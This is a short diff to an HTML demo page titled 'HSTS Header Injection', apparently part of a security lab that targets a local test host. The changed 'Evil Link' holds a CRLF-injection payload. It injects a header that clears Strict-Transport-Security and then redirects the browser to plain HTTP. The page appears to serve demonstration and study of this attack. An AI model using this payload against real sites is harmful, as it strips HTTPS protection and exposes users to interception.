@@ -8,6 +8,6 @@
 	<h1>HSTS Header Injection</h1>
 	<p>Request HTTP: <a href="http://hsts.local/?cb={{ cb }}">http://hsts.local/?cb={{ cb }}</a></p>
 	<p>Request HTTPS: <a href="https://hsts.local/?cb={{ cb }}">https://hsts.local/?cb={{ cb }}</a></p>
-	<p>Evil Link: <a href="/vuln?param=value%0d%0aStrict-Transport-Security%3a+max-age%3d0%0d%0a%0d%0a%3cscript%3elocation=%22http://hsts.local/%3fcb%3d{{ cb }}%22%3c/script%3e">/vuln?param=value%0d%0aStrict-Transport-Security%3a+max-age%3d0%0d%0a%0d%0a&lt;script&gt;location=%22http://hsts.local/%3fcb%3d{{ cb }}%22&lt;/script&gt;</a></p>
+	<p>Evil Link: <a href="https://hsts.local/vuln?param=value%0d%0aStrict-Transport-Security%3a+max-age%3d0%0d%0a%0d%0a%3cscript%3elocation=%22http://hsts.local/%3fcb%3d{{ cb }}%22%3c/script%3e">https://hsts.local/vuln?param=value%0d%0aStrict-Transport-Security%3a+max-age%3d0%0d%0a%0d%0a&lt;script&gt;location=%22http://hsts.local/%3fcb%3d{{ cb }}%22&lt;/script&gt;</a></p>
 </body>
 </html>
